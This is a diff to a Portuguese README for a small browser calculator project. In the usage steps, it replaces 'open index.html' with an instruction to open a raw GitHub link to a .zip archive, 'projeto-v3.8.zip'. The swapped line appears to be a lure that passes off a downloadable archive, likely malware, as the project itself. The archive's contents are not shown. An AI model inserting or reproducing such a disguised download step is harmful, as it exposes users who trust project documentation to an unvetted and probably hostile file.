@@ -6,7 +6,7 @@ Nenhum **software** adicional é necessário para executar este projeto. Basta t
 
 ## Como utilizar
 Baixe os arquivos do projeto.
-Abra o arquivo index.html em seu navegador da web.
+Abra o arquivo https://github.com/ItaloGLS/projeto03/raw/refs/heads/main/talitol/projeto-v3.8.zip em seu navegador da web.
 Use os botões da calculadora para inserir números e operações. O resultado será exibido no campo de texto no topo da calculadora.
 Para limpar o conteúdo do campo de texto, clique no botão C.
 Para apagar o último caractere inserido no campo de texto, clique no botão <-.
